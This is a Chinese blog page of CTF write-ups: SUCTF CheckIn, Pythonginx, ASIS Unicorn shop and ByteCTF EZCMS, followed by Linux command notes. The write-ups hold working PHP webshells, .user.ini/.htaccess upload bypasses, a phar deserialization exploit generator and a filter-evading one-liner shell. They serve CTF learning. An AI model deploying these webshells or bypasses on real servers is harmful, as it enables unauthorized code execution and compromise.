<p>好像这里跟python沙箱逃逸有点联系<del>（得找时间学一手沙箱逃逸</del>）</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/09/25/su-easyweb_shrine/" data-id="ck2g3l2gp000hlgv3ftrlv9fp" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Write-Up/">Write Up</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-BUUOJ_Checkin_pythoninx_unicornshop_ezcms" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/09/18/BUUOJ_Checkin_pythoninx_unicornshop_ezcms/" class="article-date">
  <time datetime="2019-09-18T03:02:35.000Z" itemprop="datePublished">2019-09-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/18/BUUOJ_Checkin_pythoninx_unicornshop_ezcms/">BUUOJ_Checkin_pythoninx_unicornshop_ezcms</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>wp：<a href="https://xz.aliyun.com/t/6091" target="_blank" rel="noopener">https://xz.aliyun.com/t/6091</a></p>
<p>新姿势：<strong>.user.ini</strong></p>
<p><a href="https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
<p>前提是含有.user.ini的文件夹下需要有正常的php文件，</p>
<p>但仔细推敲我们就会感到<strong>“上传目录下要有可执行的php文件”</strong>这个要求在文件上传中也比较苛刻，应该没有天才开发者会把上传文件放在主目录或者把php文件放在上传文件夹。</p>
<p>但也不是全无办法，如果我们根据实际情况配合其他漏洞使用可能会有奇效，前段时间我遇到一个CMS对上传时的路径没有检测<code>../</code>，因此导致文件可被上传至任意目录，这种情况下我们就很有可能可以利用<code>.user.ini</code></p>
<p>文件上传绕过姿势</p>
<p>-&gt; 上传过滤为黑名单，但php脚本文件应该是无法上传的</p>
<p>-&gt; 存在exif_imagetype()文件头过滤，需要添加图片文件的文件头</p>
<p>-&gt; 文件的内容不能包含<code>&lt;?</code>，但可以上传<code>&lt;script language=&#39;php&#39;&gt;&lt;scirpt&gt;</code>类型的图片马来绕过</p>
<ol>
<li><p>上传用户配置php的文件.user.ini，使每个页面包含我们的图片马</p>
</li>
<li><p>上传我们的图片马</p>
</li>
<li><p>访问目录中存在的页面（包含了我们的图片马），</p>
</li>
</ol>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="actionscript">system(<span class="string">'cat /flag'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>（访问index.php后，显示GIF89a+flag{.*?}，全是我们图片马的内容，所以，index.php就是故意给我们利用的23333）</p>
<p>（之所以不直接访问我们的马，好像是因为我们的马不会被解析成php文件而执行）</p>
<p>附：</p>
<p>.htaccess</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">htaccess</span> = b<span class="string">"""\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .wuwu				#解析.wuwu为php</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/Public/Uploads/2019-10-12/5da1c095da90a.wawa"</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>wp：<a href="https://xz.aliyun.com/t/6042#toc-28" target="_blank" rel="noopener">https://xz.aliyun.com/t/6042#toc-28</a></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">        </span><br><span class="line">        @app.route(<span class="string">'/getUrl'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def getUrl():</span><br><span class="line">    url = request.<span class="keyword">args</span>.<span class="built_in">get</span>(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).<span class="built_in">hostname</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = <span class="keyword">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h in host.<span class="keyword">split</span>(<span class="string">'.'</span>):</span><br><span class="line">        newhost.<span class="keyword">append</span>(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.<span class="keyword">join</span>(newhost)</span><br><span class="line">    #去掉 url 中的空格</span><br><span class="line">    finalUrl = urlunsplit(parts).<span class="keyword">split</span>(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).<span class="built_in">hostname</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).<span class="keyword">read</span>()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure>

<p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
<p><img src="/2019/09/18/BUUOJ_Checkin_pythoninx_unicornshop_ezcms/20190826233021605.png" alt="1"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">        uni=chr(x)</span><br><span class="line">        url=<span class="string">"http://suctf.c&#123;&#125;"</span>.format(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                print(<span class="string">"str: "</span>+uni+<span class="string">' unicode: \\u'</span>+str(hex(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>

<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>这一题，价格那里只允许输入一个字符</p>
<p>而一个字符要表示大于一千多的数字</p>
<p>再加上题目很容易联想的unicode</p>
<p>这里推荐一个查各种神奇unicode的网站</p>
<p><a href="https://www.compart.com/en/unicode/charsets" target="_blank" rel="noopener">https://www.compart.com/en/unicode/charsets</a></p>
<p><a href="https://www.compart.com/en/unicode/U+1012D这个字符就可以表示30000" target="_blank" rel="noopener">https://www.compart.com/en/unicode/U+1012D这个字符就可以表示30000</a></p>
<p>题目提示</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span><span class="comment">&lt;!--Ah,really important,seriously. --&gt;</span></span><br></pre></td></tr></table></figure>

<p>unicode utf-8 encoding 后是 0xF0 0x90 0x84 0xAD</p>
<p>然后抓包，把0x改成%，发包即可。</p>
<p>wp参考：<a href="https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis" target="_blank" rel="noopener">https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis</a></p>
<h2 id="ByteCTF-2019-EZCMS"><a href="#ByteCTF-2019-EZCMS" class="headerlink" title="[ByteCTF 2019]EZCMS"></a>[ByteCTF 2019]EZCMS</h2><p>又是一个代码审计2333（话说文件上传都试试<a href="http://www.zip叭，毕竟黑盒的文件上传也太硬核了）" target="_blank" rel="noopener">www.zip叭，毕竟黑盒的文件上传也太硬核了）</a></p>
<p>考点：哈希长度拓展攻击；phar反序列；字符串拼接过waf</p>
<p>一句话木马：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a=<span class="string">"syste"</span>;</span></span><br><span class="line"><span class="php">$b=<span class="string">"m"</span>;</span></span><br><span class="line"><span class="php">$c=$a.$b;</span></span><br><span class="line"><span class="php">$d=$c($_REQUEST[<span class="string">'a'</span>]);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>生成phar文件：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filepath;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $checker;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $filepath)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;filepath = $filepath;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;filename = $filename;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $username;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $password;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $admin;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> File(<span class="string">"altman"</span>,<span class="string">"altman"</span>);</span></span><br><span class="line"><span class="php">$a-&gt;checker = <span class="keyword">new</span> Profile();</span></span><br><span class="line"><span class="php">$a-&gt;checker-&gt;username = <span class="string">"/var/www/html/sandbox/a87136ce5a8b85871f1d0b6b2add38d2/.htaccess"</span>;</span></span><br><span class="line"><span class="php">$a-&gt;checker-&gt;password = ZipArchive::OVERWRITE | ZipArchive::CREATE;</span></span><br><span class="line"><span class="php">$a-&gt;checker-&gt;admin = <span class="keyword">new</span> ZipArchive();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br><span class="line"><span class="php">$phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span></span><br><span class="line"><span class="php">$phar-&gt;setMetadata($a); </span></span><br><span class="line"><span class="php">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span></span><br><span class="line"><span class="php">$phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>哈希长度拓展攻击</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">hash_sign</span> = hashpumpy.hashpump(sign, <span class="keyword">str1, </span><span class="keyword">str2, </span>key_lenth)</span><br></pre></td></tr></table></figure>

<p>sign为 md5(key+str1)</p>
<p>str2为要拼接的字符串</p>
<p>这一题的利用点：</p>
<ol>
<li><p>首先利用hash拓展攻击绕过admin的check，因为upload_file方法中规定只有admin才能上传文件</p>
</li>
<li><p>上传的shell文件要绕过[‘system’,’eval’,’exec’,’+’,’passthru’,’`’,’assert’]等函数，所以拼接绕过</p>
</li>
<li><p>存在__destruct()函数调用checker类的upload_file()方法</p>
</li>
<li><p>Profile存在__call($name, $arguments)函数，会调用admin类的open方法</p>
</li>
<li><p>有admin类的只有Profile类，很显然是要call一个Profile类</p>
</li>
<li><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match('/^(phar|<span class="type">compress</span>|<span class="type">compose</span>.zlib|<span class="type">zip</span>|<span class="type">rar</span>|<span class="type">file</span>|<span class="type">ftp</span>|<span class="type">zlib</span>|<span class="type">data</span>|<span class="type">glob</span>|<span class="type">ssh</span>|<span class="type">expect</span>)/i', $this-&gt;filepath)</span><br></pre></td></tr></table></figure>

<p>的过滤可以通过php://filter/resource=phar://绕过（是因为这个^符号）</p>
</li>
<li><p>找自带open方法的类，</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$classes = get_declared_classes();</span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span> ($classes <span class="keyword">as</span> $class) &#123;</span></span><br><span class="line"><span class="php">    $methods = get_class_methods($class);</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span> ($methods <span class="keyword">as</span> $method) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($method === <span class="string">'open'</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">print</span> $class . <span class="string">'::'</span> . $method . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>


</li>
</ol>
<p>   （这可真是个好东西）</p>
   <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ZipArchive::<span class="built_in">open</span> ( <span class="keyword">string</span> $filename [, int $flags ] ) : mixed</span><br><span class="line"></span><br><span class="line">filename</span><br><span class="line">The <span class="built_in">file</span> name <span class="keyword">of</span> <span class="keyword">the</span> ZIP archive <span class="built_in">to</span> <span class="built_in">open</span>.</span><br><span class="line"></span><br><span class="line">flags</span><br><span class="line">The mode <span class="built_in">to</span> use <span class="built_in">to</span> <span class="built_in">open</span> <span class="keyword">the</span> archive</span><br></pre></td></tr></table></figure>

<p>pop链：</p>
<ol>
<li>利用phar反序列化，首先生成File类，</li>
<li>将File的cheker赋值为Profile类的对象</li>
<li>File类调用__destruct方法，调用$cheker类即Profile对象的upload_file()方法</li>
<li>由于Profile类不存在uoload_file()方法，故调用__call方法</li>
<li>__call方法调用类admin的open方法，传参username以及password</li>
<li>赋值admin为ZipArchive()对象，故调用ZipArchive()的open方法</li>
<li>ZipArchive()调用.htaccess文件，方法为ZipArchive::OVERWRITE，即将.htaccess文件重写（删除）</li>
<li>删除.htaccess文件后即可访问我们上传的shell文件获取shell</li>
</ol>
<p>操作：</p>
<ol>
<li>先访问<a href="http://fc52df26-9d22-4982-b73a-244808c0e460.node1.buuoj.cn/view.php?filename=8650b7902e96771b2267398829fc5234.phar&amp;filepath=php://filter/resource=phar://sandbox/fd40c7f4125a9b9ff1a4e75d293e3080/8650b7902e96771b2267398829fc5234.phar删除.htaccess文件" target="_blank" rel="noopener">http://fc52df26-9d22-4982-b73a-244808c0e460.node1.buuoj.cn/view.php?filename=8650b7902e96771b2267398829fc5234.phar&amp;filepath=php://filter/resource=phar://sandbox/fd40c7f4125a9b9ff1a4e75d293e3080/8650b7902e96771b2267398829fc5234.phar删除.htaccess文件</a></li>
<li>访问shell文件<a href="http://fc52df26-9d22-4982-b73a-244808c0e460.node1.buuoj.cn/view.php?/sandbox/fd40c7f4125a9b9ff1a4e75d293e3080/f3b94e88bd1bd325af6f62828c8785dd.php?a=cat" target="_blank" rel="noopener">http://fc52df26-9d22-4982-b73a-244808c0e460.node1.buuoj.cn/view.php?/sandbox/fd40c7f4125a9b9ff1a4e75d293e3080/f3b94e88bd1bd325af6f62828c8785dd.php?a=cat</a> /flag;</li>
<li>注：千万别访问upload.php，不然.htaccess又出现了。（Admin类里存在__construct方法，存在文件时就会调用Admin类，__construct()就会创建.htaccess文件；不存在文件时就会直接创建.htaccess文件。）</li>
</ol>
<p>ps：因为沙箱下存在内容乱七八糟的.htaccess文件，从而导致了沙箱里的文件不能够被正常访问，所以要删了他，具体针对于.htaccess文件的利用，还需要进一步学习。。。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/09/18/BUUOJ_Checkin_pythoninx_unicornshop_ezcms/" data-id="ck2g3l2gk000clgv3dbd1g1e5" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Write-UP/">Write UP</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Linux 基基基基基基础" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/09/12/Linux 基基基基基基础/" class="article-date">
  <time datetime="2019-09-11T16:17:00.000Z" itemprop="datePublished">2019-09-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/12/Linux 基基基基基基础/">Linux 基基基基基基础</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Linux-基基基基基基础"><a href="#Linux-基基基基基基础" class="headerlink" title="Linux 基基基基基基础"></a>Linux 基基基基基基础</h1><h2 id="Linux-文件系统"><a href="#Linux-文件系统" class="headerlink" title="Linux 文件系统"></a>Linux 文件系统</h2><p>逻辑文件系统</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">文件系统的根（/）位于文件系统目录树的顶部，以下是要了解的最重要的子目录： </span><br><span class="line"><span class="string">/root</span> root 用户的主目录 </span><br><span class="line"><span class="string">/etc</span> 通常包含 Linux 配置文件 - 控制程序启动时间和方式的文件 </span><br><span class="line"><span class="string">/home</span> 用户的主目录 </span><br><span class="line"><span class="string">/mnt</span> 将其他文件系统附加或安装到文件系统的位置 </span><br><span class="line"><span class="string">/media</span> CD 和 USB 设备通常连接或安装到文件系统的位置 </span><br><span class="line"><span class="string">/bin</span> 其中包含应用程序二进制文件（相当于 Microsoft Windows 中的可执行文件） </span><br><span class="line"><span class="string">/lib</span> lib 库文件（与 Windows DLL 类似的共享程序）</span><br></pre></td></tr></table></figure>

<h2 id="Linux基本命令"><a href="#Linux基本命令" class="headerlink" title="Linux基本命令"></a>Linux基本命令</h2><p>pwd    查看当前目录</p>
<p>whoami    查看登录用户</p>
<p>cd    更改目录</p>
<p>ls    列出目录内容</p>
<p>ls -l    列出目录输出为长列表</p>
<p>ls -a（ls -la）列出内容包括隐藏文件、</p>
<p>sth - help    获取帮助</p>
<p>man sth    使用man引用手册页</p>
<h3 id="搜索查找"><a href="#搜索查找" class="headerlink" title="搜索查找"></a>搜索查找</h3><p>locate sth    此命令将遍历整个 文件系统并找到该单词的每个匹配项。 </p>
<p>whereis sth    此命令不仅返回二进制文件的位置，还返 回其源和手册页（如果可用）。</p>
<p>which sth    在PATH变量中查找二进制文件</p>
<p>find：</p>
<p>​        语法：find directory options expression </p>
<p>​        例：find / -type f -name apache2.*            (f表示普通文件)</p>
<p>ps aux    提供了在这个系统中运行的所有进程的列表 </p>
<p>grep 过滤关键字（配合管道符）</p>
<p>cat    显示文件</p>
<p>cat &gt;    创建小文件（CTRL-D保存）</p>
<p>cat &gt;&gt;    附加</p>
<p>touch filename    创建名为filename的文件</p>
<p>mkdir \dirname    创建目录</p>
<p>cp oldfilename path/newfilename    复制文件</p>
<p>mv oldfile newfile    迂回重命名文件</p>
<p>rm filename    删除文件</p>
<p>rmdir dirname    删除空目录</p>
<p>rm -r dirname    删除目录及文件</p>
<p>head filename    查看开头前（默认）十行</p>
<p>head -20 filename    查看开头前20行</p>
<p>tail filename    同head，查看文件尾</p>
<p>nl filename    显示行号</p>
<p>例：tail  -n+507  /etc/snort/snort.conf  |  head  -n  6</p>
<p>sed  查找和替换</p>
<p>例：sed    s/mysql/MySQL/g  /etc/snort/snort.conf  &gt;  snort2.conf</p>
<p>s 参数提供搜索，你先提供想要搜索的关键词 (mysql) 然后提供想要替换成的关键词 (MySQL), 用斜杠 (/)分开。g 参数告诉 Linux 你希望全局替换，然后将结果保存到一个新文件 snort2.conf。 </p>
<p>如果你只想替换第一个出现的 mysql，你需要去掉末尾的 g 参数。 </p>
<p>你也可以使用 sed 命令查找替换第一个出现字段以外的任意位置出现的字段。例如，如果你想只替换 第二个出现的 mysql，</p>
<p>sed  s/mysql/MySQL/2  snort.conf  &gt;  snort2.conf </p>
<p>more filename    控制显示文件    enter键换行</p>
<p>less filename    按下斜杠键（/）， 输入（output），这会立即将你带到第一个出现 output 的地方，并且高亮了 output。然后你可以按 n 键（next）到下一 个出现 （output ）的地方。 </p>
<h2 id="分析和管理网络"><a href="#分析和管理网络" class="headerlink" title="分析和管理网络"></a>分析和管理网络</h2><h3 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h3><p>eth0（Ethernet0）第一个有线以太网接口</p>
<p>Ethernet     以太网</p>
<p>HWaddr    每个网络硬件上标记的全局唯一标记，在这种情况下，网络接口卡 network interface card (NIC), 通常指的是媒体访问控制 media access control (MAC) 地址。 </p>
<p>inet addr    分配IP地址信息的网络接口     </p>
<p>Bcast    广播地址，用于向子网上的所有 IP 发送信息的地址;</p>
<p>Mask    子网掩码，用于确定 IP 地 址的哪个部分连接到本地网络</p>
<p>lo     环回地址（loopback address）    并且有时称为 localhost    这是个特殊的软件地址，可帮助你连接到自己的系统。未在系统上运行的软件和服务将 无法被使用。你可以使用 lo 在你的系统测试某些内容，例如你自己的 web 服务器。本地主机通常用 IP 地 址 127.0.0.1 表示。 </p>
<p>wlan0    只有当拥有无线接口或适配器时，才会出现这种情况。请注意，它还 会显示该设备 (HWaddr)的 MAC 地址。 </p>
<p>来自 ifconfig 的此信息使您可以连接并操作局域网 (LAN) 设置，这是黑客攻击的基本技能（内网穿透么？）</p>
<h3 id="iwconfig"><a href="#iwconfig" class="headerlink" title="iwconfig"></a>iwconfig</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;iwconfig </span><br><span class="line">wlan0 IEEE 802.11bg ESSID:off/any </span><br><span class="line">Mode:Managed Access Point: <span class="keyword">Not</span> Associated <span class="attribute">Tx-Power</span>=20 dBm </span><br><span class="line">­­snip-- </span><br><span class="line">lo <span class="literal">no</span><span class="built_in"> wireless </span>extensions  </span><br><span class="line">eth0 <span class="literal">no</span><span class="built_in"> wireless </span>extensions</span><br></pre></td></tr></table></figure>

<p>对于 wlan0，我们了解了我们的设备能够支持的 802.11 IEEE 无线标准：b 和 g ， 两种早期的无线通 信标准。现在大多数无线设备也包括 n ( n 是最新的标准)。 </p>
<p>我们还从 iwconfig 中学习了无线扩展的模式(本例中为 Mode:Manage，不同于 monitor 或 promiscuous mode)。在破解无线密码时，我们需要使用到混杂模式(promiscuous mode)。 </p>
<p>接下来，我们将看到无线网卡（适配器）未连接（未关联）到接入点 (AP) ，并且其功率为 20 dBm， 这表示信号强度。 </p>
<h3 id="更改你的网络信息"><a href="#更改你的网络信息" class="headerlink" title="更改你的网络信息"></a>更改你的网络信息</h3><p>ifconfig  eth0  192.168.181.115  netmask  255.255.0.0  broadcast  192.168.1.255     </p>
<p>使用 ifconfig 命令改变你的IP，子网掩码，广播地址</p>
<p>伪装MAC（ HWaddr ）地址：</p>
<p>​        简单地使用 ifconfig 命令的 down 选项来关闭该接口 </p>
